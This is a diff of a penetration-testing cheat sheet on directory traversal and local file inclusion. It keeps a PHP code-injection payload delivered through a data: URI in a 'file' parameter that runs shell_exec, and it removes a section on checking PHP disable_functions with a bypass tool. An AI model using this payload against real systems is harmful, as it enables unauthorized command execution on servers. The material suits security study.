@@ -13,13 +13,7 @@ It can be used to exploit Directory Traversal and LFI. This gives us additional 
 http://<IP>/menu.php?file=data:text/plain,<?php echo shell_exec("whoami")?>
 ```
 
-### PHP Checker
-https://github.com/teambi0s/dfunc-bypasser
-```
-<?php phpinfo(); ?>
 
-python dfunc-bypasser.py --file /home/kali/Downloads/miinfo.html
-```
 
 ### Good ASPX Webshell
 
